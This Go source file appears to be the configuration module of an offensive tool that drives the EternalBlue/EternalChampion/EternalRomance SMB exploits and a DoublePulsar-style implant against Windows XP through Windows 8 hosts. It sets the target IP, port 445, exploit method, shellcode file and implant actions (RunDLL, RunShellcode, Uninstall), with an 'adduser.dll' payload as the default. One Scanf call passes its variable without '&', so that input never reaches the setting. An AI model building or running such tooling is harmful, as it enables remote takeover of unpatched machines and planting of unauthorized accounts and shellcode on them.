package metatdatas

import (
	"eternal/utils"
	"fmt"
	"reflect"
)

type Meta struct {
	NetworkTimeout  string
	Protocol        string
	TargetIp        string
	TargetPort      string
	DLLPath         string
	DLLBuffer       string
	Arch            string
	Target          string
	ShellcodeFile   string
	ShellcodeBuffer string
	OutputInstall   string
	ExploitMethod   string
	Function        string
}

var MetaData = Meta{
	TargetPort:     "445",
	Protocol:       "SMB",
	NetworkTimeout: "20",
	DLLPath:        "./dlls/adduser.dll",
	Arch:           "x64",
	Target:         "SERVER_2008R2_SP1",
	Function:       "Ping",
	OutputInstall:  "./target.bin",
	ExploitMethod:  "Default",
}
var protocols = []string{"SMB", "NBT", "RDP"}
var archs = []string{"x86", "x64", "unknown"}
var ec_targets = []string{"XP_SP0SP1_X86", "XP_SP2SP3_X86", "XP_SP1_X64", "XP_SP2_X64", "SERVER_2003_SP0", "SERVER_2003_SP1", "SERVER_2003_SP2", "VISTA_SP0", "VISTA_SP1", "VISTA_SP2", "SERVER_2008_SP0", "SERVER_2008_SP1", "SERVER_2008_SP2", "WIN7_SP0", "WIN7_SP1", "SERVER_2008R2_SP0", "SERVER_2008R2_SP1", "WIN8_SP0"}
var eb_targets = []string{"XP", "WIN72K8R2"}
var er_targets = []string{"XP_SP0SP1_X86", "XP_SP2SP3_X86", "XP_SP1_X64", "XP_SP2_X64", "SERVER_2003_SP0", "SERVER_2003_SP1", "SERVER_2003_SP2", "VISTA_SP0", "VISTA_SP1", "VISTA_SP2", "SERVER_2008_SP0", "SERVER_2008_SP1", "SERVER_2008_SP2", "WIN7_SP0", "WIN7_SP1", "SERVER_2008R2_SP0", "SERVER_2008R2_SP1"}
var functions = []string{"OutputInstall", "Ping", "RunDLL", "RunShellcode", "Uninstall"}
var er_exploitMethod = []string{"Default", "Fish-in-a-barrel", "Matched-pairs", "Classic-Romance"}

func SetDefaultMetaData() {
	for {
		fmt.Print("Set Default Target:")
		TargetIp := ""
		fmt.Scanf("%s\n", &TargetIp)
		if !utils.IPChecker(TargetIp) {
			fmt.Println("Wrong IP Address....")
		} else {
			MetaData.TargetIp = TargetIp
			break
		}
	}
}
func (M *Meta) SetShellcodeFile() {
	ShellcodeFile := ""
	for {
		fmt.Printf("Set DOUP ShellcodeFile:")
		fmt.Scanf("%s\n", &ShellcodeFile)
		if ShellcodeFile == "" {
			fmt.Println("Wrong Shellcode File Path ")
			continue
		} else {
			M.ShellcodeFile = ShellcodeFile
			break
		}
	}
	M.ShellcodeBuffer = utils.BinToHex(M.ShellcodeFile)
	fmt.Println("ShellcodeFile ==> " + M.ShellcodeFile)

}
func (M *Meta) SetExploitMethod() {
	ExploitMethod := 0
	fmt.Printf(`0) Default              Use the best exploit method(s) for the target OS
1) Fish-in-a-barrel     Most reliable exploit method (XP/2k3 only)
2) Matched-pairs        Next reliable exploit method (XP/Win7/2k8R2 only)
3) Classic-Romance      Original LargePageGroom exploit method (All OS Versions)
								Select ExploitMethod(Default is %s):`, er_exploitMethod[ExploitMethod])
	fmt.Scanf("%d\n", ExploitMethod)
	M.ExploitMethod = er_exploitMethod[ExploitMethod]
	fmt.Println("ExploitMethod ==> " + M.ExploitMethod)
}
func (M *Meta) SetProtocol() {
	Protocol := -1
	fmt.Printf("0.SMB\n1.NBT\n2.RDP\nSeletc Protocol:")
	fmt.Scanf("%d\n", &Protocol)
	M.Protocol = protocols[Protocol]
	fmt.Println("Protocol ==> " + M.Protocol)
}
func (M *Meta) SetTargetPort() {
	fmt.Printf("Set TargetPort:")
	fmt.Scanf("%s\n", &M.TargetPort)
	fmt.Println("TargetPort ==> " + M.TargetPort)
}
func (M *Meta) SetTargetIp() {
	fmt.Printf("Set TargetIp:")
	fmt.Scanf("%s\n", &M.TargetIp)
	fmt.Println("TargetIp ==> " + M.TargetIp)
}
func (M *Meta) SetNetworkTimeout() {
	fmt.Printf("Set NetworkTimeout:")
	fmt.Scanf("%s\n", &M.NetworkTimeout)
	fmt.Println("NetworkTimeout ==> " + M.NetworkTimeout)
}
func (M *Meta) SetDLLPath() {
	DLLPath := ""
	fmt.Printf("Set DLLPath(%s):", M.DLLPath)
	fmt.Scanf("%s\n", &DLLPath)
	if DLLPath == "" {
		fmt.Println("DLLPath ==> " + M.DLLPath)
		return
	} else {
		M.DLLPath = DLLPath
	}
	fmt.Println("DLLPath ==> " + M.DLLPath)
}
func (M *Meta) SetArch() {
	arch := -1
	fmt.Printf("0.x86\n1.x64\n2.unknown\nSeletc Arch(%s):", M.Arch)
	fmt.Scanf("%d\n", &arch)
	if arch == -1 {
		fmt.Println("Arch ==> " + M.Arch)
		return
	}
	M.Arch = archs[arch]
	fmt.Println("Arch ==> " + M.Arch)
}
func (M *Meta) SetTarget(exp string) {
	if exp == "eb" {
		target := 1
		fmt.Printf("0) XP\n1) WIN72K8R2\nSelect Target(%s):", eb_targets[target])
		fmt.Scanf("%d\n", &target)
		M.Target = eb_targets[target]
	} else if exp == "ec" {
		target := 16
		fmt.Printf(`0) XP_SP0SP1_X86         Windows XP Sp0 and Sp1, 32-bit
1) XP_SP2SP3_X86         Windows XP Sp2 and Sp3, 32-bit
2) XP_SP1_X64            Windows XP Sp1, 64-bit
3) XP_SP2_X64            Windows XP Sp2, 64-bit
4) SERVER_2003_SP0       Windows Sever 2003 Sp0, 32-bit
5) SERVER_2003_SP1       Windows Sever 2003 Sp1, 32-bit/64-bit
6) SERVER_2003_SP2       Windows Sever 2003 Sp2, 32-bit/64-bit
7) VISTA_SP0             Windows Vista Sp0, 32-bit/64-bit
8) VISTA_SP1             Windows Vista Sp1, 32-bit/64-bit
9) VISTA_SP2             Windows Vista Sp2, 32-bit/64-bit
10) SERVER_2008_SP0       Windows Server 2008 Sp0, 32-bit/64-bit
11) SERVER_2008_SP1       Windows Server 2008 Sp1, 32-bit/64-bit
12) SERVER_2008_SP2       Windows Server 2008 Sp2, 32-bit/64-bit
13) WIN7_SP0              Windows 7 Sp0, 32-bit/64-bit
14) WIN7_SP1              Windows 7 Sp1, 32-bit/64-bit
15) SERVER_2008R2_SP0     Windows Server 2008 R2 Sp0, 32-bit/64-bit
16) SERVER_2008R2_SP1     Windows Server 2008 R2 Sp1, 32-bit/64-bit
17) WIN8_SP0              Windows 8 Sp0, 32-bit/64-bit
							Seletc Target(%s):`, ec_targets[target])
		fmt.Scanf("%d\n", &target)
		M.Target = ec_targets[target]
	} else if exp == "er" {
		target := 0
		fmt.Printf(`0) XP_SP0SP1_X86         Windows XP Sp0 and Sp1, 32-bit
1) XP_SP2SP3_X86         Windows XP Sp2 and Sp3, 32-bit
2) XP_SP1_X64            Windows XP Sp1, 64-bit
3) XP_SP2_X64            Windows XP Sp2, 64-bit
4) SERVER_2003_SP0       Windows Sever 2003 Sp0, 32-bit
5) SERVER_2003_SP1       Windows Sever 2003 Sp1, 32-bit/64-bit
6) SERVER_2003_SP2       Windows Sever 2003 Sp2, 32-bit/64-bit
7) VISTA_SP0             Windows Vista Sp0, 32-bit/64-bit
8) VISTA_SP1             Windows Vista Sp1, 32-bit/64-bit
9) VISTA_SP2             Windows Vista Sp2, 32-bit/64-bit
10) SERVER_2008_SP0       Windows Server 2008 Sp0, 32-bit/64-bit
11) SERVER_2008_SP1       Windows Server 2008 Sp1, 32-bit/64-bit
12) SERVER_2008_SP2       Windows Server 2008 Sp2, 32-bit/64-bit
13) WIN7_SP0              Windows 7 Sp0, 32-bit/64-bit
14) WIN7_SP1              Windows 7 Sp1, 32-bit/64-bit
15) SERVER_2008R2_SP0     Windows Server 2008 R2 Sp0, 32-bit/64-bit
16) SERVER_2008R2_SP1     Windows Server 2008 R2 Sp1, 32-bit/64-bit
									Seletc Target(%s):`, er_targets[target])
		fmt.Scanf("%d\n", &target)
		M.Target = er_targets[target]
	}
	fmt.Println("Target ==> " + M.Target)
}
func (M *Meta) SetFunction() {
	function := 1
	fmt.Printf("0.OutputInstall\n1.Ping\n2.RunDLL\n3.RunShellcode\n4.Uninstall\nSeletc Arch(%s):", functions[function])
	fmt.Scanf("%d\n", &function)
	M.Function = functions[function]
	fmt.Println("Function ==> " + M.Function)
}
func (M *Meta) SetOutputInstall() {
	OutputInstall := ""
	fmt.Printf("Input OutputInstall Path(%s):", M.OutputInstall)
	fmt.Scanf("%s\n", &OutputInstall)
	if OutputInstall == "" {
		fmt.Println("Wrong OutputInstall Path.")
		return
	}
	M.OutputInstall = OutputInstall
	fmt.Println("OutputInstall ==> " + M.OutputInstall)
}
func (M Meta) ShowMetaData() {
	var typeInfo = reflect.TypeOf(M)
	var valInfo = reflect.ValueOf(M)
	num := typeInfo.NumField()
	for i := 0; i < num; i++ {
		key := typeInfo.Field(i).Name
		val := valInfo.Field(i).Interface()
		if key == "ShellcodeBuffer" {
			val = "..."
		}
		fmt.Printf("%v ==> %v\n", key, val)
	}
}
